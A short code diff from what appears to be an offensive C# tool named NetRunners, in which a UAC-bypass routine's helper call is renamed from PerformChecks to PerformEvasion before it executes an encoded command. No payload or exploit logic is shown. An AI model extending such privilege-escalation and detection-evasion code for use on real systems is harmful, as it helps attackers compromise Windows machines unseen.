@@ -42,7 +42,7 @@ namespace NetRunners.Uac
                 string cmd = SelectCmd();
                 
                 // evasion
-                NetRunners.Helpers.Helper.PerformChecks();
+                NetRunners.Helpers.Helper.PerformEvasion();
                 
                 // heads up
                 Console.WriteLine("[+] No base64 command selected.");
@@ -55,7 +55,7 @@ namespace NetRunners.Uac
             else
             {
                 // evasion
-                NetRunners.Helpers.Helper.PerformChecks();
+                NetRunners.Helpers.Helper.PerformEvasion();
                 // execution
                 ExecuteBypass(bypass, encodedCommand);
             }
